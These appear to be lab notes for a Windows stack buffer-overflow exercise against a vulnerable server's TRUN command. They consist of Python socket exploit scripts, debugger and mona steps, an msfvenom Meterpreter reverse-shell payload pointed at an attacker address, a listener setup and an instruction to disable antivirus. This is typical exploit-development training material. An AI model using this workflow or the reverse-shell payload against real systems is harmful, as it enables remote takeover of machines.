```
Windows Exploit Development

Vulnerability - Weakness
Exploit - Take Advantage of Weakness
Payload - Bomb

```
```
#!/usr/bin/python
import socket

buf = "TRUN /.:/"
buf += "A" * 2500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("<tar_ip>",<tar_port>))                         # connect to target ip and port
s.send(buf)                                                # send buf to server
print s.recv(1024)                                         # print response

s.close()                                                  # close connection
```
```
launch vuln_serv > immunity debugger                       # top left - assembly instruction
cpu > max > doubleclick c > file > attach > server         # top right - registers
press play > run script > verify program broke             # bottom left - hex dump
                                                           # bottom right - stack
```
```
#!/usr/bin/python
import socket

buf = "TRUN /.:/"
buf += "https://wiremask.eu/tools/buffer-overflow-pattern-generator/"     # find offset

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("<tar_ip>",<tar_port>))                         
s.send(buf)                                                
print s.recv(1024)                                         

s.close()                                                  
```
```
launch prog> immunity debugger
cpu > max > doubleclick c > file > attach > server
press play > run script > EIP OF REMOTE PROGRAM (top right) > offset
```
```
#!/usr/bin/python
import socket

buf = "TRUN /.:/"
buf += "A" * 2003                                        # fill with known buffer size
buf += "B" * 4                                           # write to EIP
buf += "C" * 20                                          # where shellcode will go

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("<tar_ip>",<tar_port>))                         
s.send(buf)                                                
print s.recv(1024)                                         

s.close()                                                  
```
```
bottom bar > !mona modules -o

IF FALSE = GOOD
IF TRUE = NEED TO WORK AROUND

bottom bar > !mona jmp -r esp -m "<vuln_module.dll>"
top l
LOOK AT JMP ESP choose take 
```
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.37.248 LPORT=4444 -b "\x00" -f python
```
```
#!/usr/bin/python
import socket

buf = "TRUN /.:/"

'''
<jmp esp 1> :: 0x625011af  :: \xaf\x11\x50\x62                    # convert instruction to endian
<jmp esp 2>
<jmp esp 3>
'''

buf += "A" * 2003                                        
buf += "\xaf\x11\x50\x62"                                          # new endian as JMP ESP instruct
buf += "\x90" * 50                                                 # nop sled
buf += <shell code>                                 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("<tar_ip>",<tar_port>))                         
s.send(buf)                                                
print s.recv(1024)                                         

s.close()
```
```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.50.37.248
set LPORT 4444
```
```
TURN OFF AV !!!!!
run vuln server
exploit
```
